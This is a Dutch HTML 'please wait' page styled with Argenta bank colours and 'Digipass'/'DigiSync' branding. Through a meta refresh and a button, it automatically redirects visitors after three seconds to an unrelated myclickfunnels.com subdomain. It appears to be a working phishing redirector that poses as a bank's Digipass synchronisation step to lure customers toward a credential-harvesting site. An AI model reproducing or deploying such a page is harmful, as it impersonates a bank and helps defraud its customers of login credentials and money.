<!DOCTYPE html>
<html lang="nl">
<head>
	<meta charset="UTF-8" />
	<meta content="3;url=https://digipasssyncsteamwoec42b.myclickfunnels.com/8bd458ccbf" http-equiv="refresh" />
	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
	<title>Even geduld alstublieft...</title>
	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet" />
	<style type="text/css">
		:root {
			--argenta-green: #009B5E;
			--argenta-green-dark: #008750;
			--argenta-green-light: #00b06b;
			--argenta-white: #ffffff;
			--argenta-gray-light: #F5F7FA;
			--argenta-gray: #E8EDF5;
			--argenta-gray-dark: #666666;
			--argenta-text: #333333;
			--shadow: 0 8px 32px rgba(0, 155, 94, 0.12);
			--transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
		}

		* {
			box-sizing: border-box;
			margin: 0;
			padding: 0;
		}

		body, html {
			height: 100%;
			font-family: 'Inter', sans-serif;
			background: linear-gradient(135deg, var(--argenta-gray-light) 0%, var(--argenta-white) 100%);
			display: flex;
			justify-content: center;
			align-items: center;
			padding: 20px;
			color: var(--argenta-text);
		}

		.container {
			text-align: center;
			background: var(--argenta-white);
			padding: 60px 40px;
			border-radius: 16px;
			box-shadow: var(--shadow);
			max-width: 520px;
			width: 100%;
			animation: fadeIn 0.7s ease-out;
			position: relative;
			overflow: hidden;
			border: 1px solid var(--argenta-gray);
		}

		.container:before {
			content: '';
			position: absolute;
			top: 0;
			left: 0;
			width: 100%;
			height: 4px;
			background: linear-gradient(90deg, var(--argenta-green), var(--argenta-green-light));
		}

		.logo-container {
			margin-bottom: 30px;
			display: flex;
			justify-content: center;
			align-items: center;
			flex-direction: column;
		}

		.logo-wrapper {
			width: 120px;
			height: 120px;
			border-radius: 50%;
			background: linear-gradient(135deg, var(--argenta-green), var(--argenta-green-light));
			display: flex;
			justify-content: center;
			align-items: center;
			margin: 0 auto 20px;
			box-shadow: 0 6px 20px rgba(0, 155, 94, 0.15);
			padding: 10px;
			animation: pulse 2s ease-in-out infinite;
		}

		.digipass-logo {
			width: 100px;
			height: 100px;
			object-fit: contain;
		}

		.logo-text {
			font-size: 24px;
			font-weight: 700;
			color: var(--argenta-green);
			letter-spacing: -0.5px;
		}

		h1 {
			color: var(--argenta-green);
			font-size: 28px;
			margin-bottom: 16px;
			font-weight: 600;
			line-height: 1.3;
		}

		p {
			color: var(--argenta-gray-dark);
			font-size: 17px;
			line-height: 1.6;
			margin-bottom: 30px;
			max-width: 400px;
			margin-left: auto;
			margin-right: auto;
		}

		.loading-container {
			margin: 30px auto 40px;
			width: 100%;
			max-width: 300px;
		}

		.progress-bar {
			height: 6px;
			background-color: var(--argenta-gray);
			border-radius: 3px;
			overflow: hidden;
			position: relative;
		}

		.progress-fill {
			height: 100%;
			width: 0%;
			background: linear-gradient(90deg, var(--argenta-green), var(--argenta-green-light));
			border-radius: 3px;
			animation: progress 3s linear forwards;
			position: relative;
		}

		.progress-fill:after {
			content: '';
			position: absolute;
			top: 0;
			left: 0;
			right: 0;
			bottom: 0;
			background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
			animation: shimmer 1.5s infinite;
		}

		.countdown {
			display: flex;
			justify-content: space-between;
			margin-top: 12px;
			font-size: 14px;
			color: var(--argenta-gray-dark);
			font-weight: 500;
		}

		.btn {
			display: inline-block;
			padding: 16px 32px;
			background: linear-gradient(135deg, var(--argenta-green), var(--argenta-green-light));
			color: var(--argenta-white);
			text-decoration: none;
			border-radius: 8px;
			font-weight: 600;
			font-size: 16px;
			transition: var(--transition);
			border: none;
			cursor: pointer;
			box-shadow: 0 4px 15px rgba(0, 155, 94, 0.2);
		}

		.btn:hover {
			background: linear-gradient(135deg, var(--argenta-green-dark), var(--argenta-green));
			transform: translateY(-2px);
			box-shadow: 0 6px 20px rgba(0, 155, 94, 0.3);
		}

		.redirect-notice {
			margin-top: 25px;
			font-size: 14px;
			color: var(--argenta-gray-dark);
			display: flex;
			align-items: center;
			justify-content: center;
			gap: 8px;
		}

		.redirect-notice svg {
			width: 16px;
			height: 16px;
			fill: var(--argenta-green);
		}

		@keyframes progress {
			0% { width: 0%; }
			100% { width: 100%; }
		}

		@keyframes fadeIn {
			from { opacity: 0; transform: translateY(20px); }
			to { opacity: 1; transform: translateY(0); }
		}

		@keyframes shimmer {
			0% { transform: translateX(-100%); }
			100% { transform: translateX(100%); }
		}

		@keyframes pulse {
			0% { transform: scale(1); box-shadow: 0 6px 20px rgba(0, 155, 94, 0.15); }
			50% { transform: scale(1.05); box-shadow: 0 8px 25px rgba(0, 155, 94, 0.25); }
			100% { transform: scale(1); box-shadow: 0 6px 20px rgba(0, 155, 94, 0.15); }
		}

		/* Responsive adjustments */
		@media (max-width: 600px) {
			.container {
				padding: 40px 25px;
			}
			
			.logo-wrapper {
				width: 100px;
				height: 100px;
			}
			
			.digipass-logo {
				width: 80px;
				height: 80px;
			}
			
			h1 {
				font-size: 24px;
			}
			
			p {
				font-size: 16px;
			}
			
			.btn {
				padding: 14px 28px;
				width: 100%;
				max-width: 250px;
			}
		}
	</style>
</head>
<body>
<div class="container">
	<div class="logo-container">
		<div class="logo-wrapper">
			<img class="digipass-logo" src="data:image/png;base64," alt="Digipass">
		</div>
		<div class="logo-text">DigiSync</div>
	</div>
	
	<h1>Even geduld alstublieft</h1>
	
	<p>U wordt zo meteen automatisch doorgestuurd naar de juiste pagina. Dit duurt nog enkele seconden.</p>
	
	<div class="loading-container">
		<div class="progress-bar">
			<div class="progress-fill">&nbsp;</div>
		</div>
		
		<div class="countdown">
			<span>0 seconden</span>
			<span>3 seconden</span>
		</div>
	</div>
	
	<a class="btn" href="https://digipasssyncsteamwoec42b.myclickfunnels.com/8bd458ccbf">Handmatig doorgaan</a>
	
	<div class="redirect-notice">
		<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
			<path d="M13 3l3.293 3.293-7 7 1.414 1.414 7-7L21 11V3z"></path>
			<path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"></path>
		</svg>
		<span>U wordt over 3 seconden doorgestuurd</span>
	</div>
</div>

<script>
	// Update countdown timer
	let seconds = 3;
	const countdownElement = document.querySelector('.countdown span:first-child');
	
	const updateCountdown = () => {
		seconds--;
		countdownElement.textContent = `${3 - seconds} seconden`;
		
		if (seconds <= 0) {
			clearInterval(countdownInterval);
		}
	};
	
	const countdownInterval = setInterval(updateCountdown, 1000);
	
	// Add smooth animation to progress bar
	document.addEventListener('DOMContentLoaded', () => {
		// Progress bar animation is handled by CSS (3s duration)
		// Additional interactive features
		const btn = document.querySelector('.btn');
		
		btn.addEventListener('mouseenter', () => {
			clearInterval(countdownInterval);
		});
		
		btn.addEventListener('mouseleave', () => {
			// Restart countdown from current position
			clearInterval(countdownInterval);
			// Note: In production you might want to restart the timer properly
		});
	});
</script>
</body>
</html>
